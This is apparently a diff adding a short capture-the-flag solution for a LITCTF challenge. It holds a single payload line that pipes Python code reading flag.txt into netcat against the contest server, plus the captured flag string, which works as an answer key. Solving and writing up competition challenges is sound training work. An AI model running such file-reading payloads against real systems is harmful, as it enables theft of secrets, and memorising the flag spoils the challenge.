@@ -1,0 +1,3 @@
+Payload: echo "os.write(1, open('flag.txt').read().encode())" | nc litctf.org 31787
+
+LITCTF{py7h0n:_w3r3_u_k1ll3d?_stdout:_s4dly_y3s...BUT_I_L1VED}
